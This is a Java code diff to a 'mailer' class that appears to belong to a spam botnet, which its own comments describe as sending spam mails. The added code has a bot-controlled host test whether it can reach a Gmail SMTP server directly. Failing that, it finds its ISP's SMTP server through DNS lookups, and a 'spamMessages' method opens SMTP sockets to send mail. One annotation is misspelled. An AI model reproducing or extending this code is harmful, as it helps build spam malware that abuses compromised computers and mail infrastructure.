@@ -18,6 +18,7 @@ import java.util.Locale;
  *  it's objects can also determine
  *  whether they can send the spam mails 
  *  or not.
+ *  Includes the spam mail header format.
  * @author sindat
  *****************************************/
 public class mailer {
@@ -25,7 +26,25 @@ public class mailer {
     String smtpServer;
     
     public mailer(bot theBot) {
-        
+        if (mailer.canSendSMTP("gmail-smtp-in.1.google.com")) {
+            mode = "self";
+            smtpServer = theBot.hostNetParams.hostFQDN;
+        } else {
+            theBot.hostNetParams.getDNSdata(theBot.publicIpAddr);
+            String hostSMTPserver = theBot.hostNetParams.findSMTPserver(theBot.hostNetParams.hostDomainName);
+            if (hostSMTPserver != null) {
+                if (mailer.canSendSMTP(hostSMTPserver)) {
+                    mode = "isp";
+                    smtpServer = hostSMTPserver;
+                } else {
+                    mode = "filtered";
+                    smtpServer = null;
+                  }
+            } else {
+                mode = "filtered";
+                smtpServer = null;
+              }
+        }
     }
     
     /****************************************
@@ -55,6 +74,7 @@ public class mailer {
      * @param body
      * @return 
      *************************************/
+    @SupressWarnings("deprecation")
     public static Boolean spamMessages(String smtpServer, int port, String subject, String fromAddress, String toAddress, String body) {
         Socket smtpSocket = null;
         DataOutputStream socketOutputStream = null;
